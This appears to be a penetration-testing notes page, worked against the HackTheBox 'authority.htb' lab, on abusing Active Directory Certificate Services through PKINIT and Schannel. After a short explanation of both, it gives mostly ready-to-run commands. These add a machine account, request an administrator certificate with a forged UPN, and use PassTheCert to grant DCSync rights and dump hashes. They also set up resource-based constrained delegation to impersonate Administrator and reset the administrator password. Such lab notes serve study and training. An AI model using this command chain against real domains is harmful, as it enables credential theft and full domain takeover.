---
description: Kerberos extension that allows users to authenticate using X.509 certificates
---

# PKINIT

### <mark style="color:yellow;">PKINIT and Kerberos Authentication</mark>

PKINIT is an extension for Kerberos Protocol to enable public key cryptography for authentication. Kerberos uses symmetric key crypto so a client and KDC share a key. PKINIT allows to authenticate using a public key which is more secure.

{% hint style="info" %}
`PKINIT` utilizes `X.509 certificates` issued by `ADCS` to support public key crypto during authentication. ADCS issues certificates to clients in the PKINIT process, allowing them to use public-private key pairs.
{% endhint %}

### <mark style="color:yellow;">Secure Channel (Schannel) Authentication</mark>

`Schannel`, Window's security support provider for `TLS/SSL connections`. It handles client authentication using certificates. When a client connects, the server requests a certificate to verify identity, it client has a trusted CA-issued certificate the servers grants access.

Schannel tries to link credentials to a user using Kerberos S4U2Self, if that fails it checks other methods like MS-RCMP. By default, only a few protocols in Active Directory support Schannel authentication, such as **WinRM, RDP, and IIS** (with extra setup).

#### Start with adding a computer

```sh
addcomputer.py 'authority.htb/blwasp':'Password123!' -method LDAPS -computer-name 'HTB01$' -computer-pass 'MyPassword123!' -dc-ip 10.129.229.56
```

#### Request certificate with alternative SAN

```shell-session
certipy req -u 'HTB01$' -p 'MyPassword123!' -ca AUTHORITY-CA -dc-ip 10.129.229.56 -template CorpVPN -upn administrator@authority.htb
```

#### Authenticate

```sh
$ certipy auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

This `ADCS server` does not support `PKINIT` causing the error.

## PassTheCert

Extract the private key from .pfx, needs a value form pem phrase.

```sh
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
```

Extract the public key from .pfx

```shell-session
openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.crt
```

Remove passphrase and write RSA

```shell-session
openssl rsa -in administrator.key -out administrator-nopass.key
```

### <mark style="color:yellow;">DCSync</mark>

```sh
# Passthecert grant rights
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target blwasp -elevate

# DCSync
secretsdump.py 'authority.htb/blwasp':'Password123!'@10.129.229.56
```

### <mark style="color:yellow;">RBCD</mark>

```sh
# Create new computer
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action add_computer -computer-name 'HTB02$' -computer-pass AnotherComputer002

# Add delegation rights
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'HTB02$'

# Get TGT
getST.py -spn 'cifs/authority.authority.htb' -impersonate Administrator 'authority.htb/HTB02$:AnotherComputer002'

# Authenticate
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass authority.authority.htb
```

### <mark style="color:yellow;">Password Reset</mark>

```sh
# Password Reset
python3 passthecert.py -dc-ip 10.129.229.56 -crt administrator.crt -key administrator-nopass.key -domain authority.htb -port 636 -action modify_user -target administrator -new-pass HackingViaLDAPS001

# Authenticate
wmiexec.py administrator:HackingViaLDAPS001@10.129.229.56
```
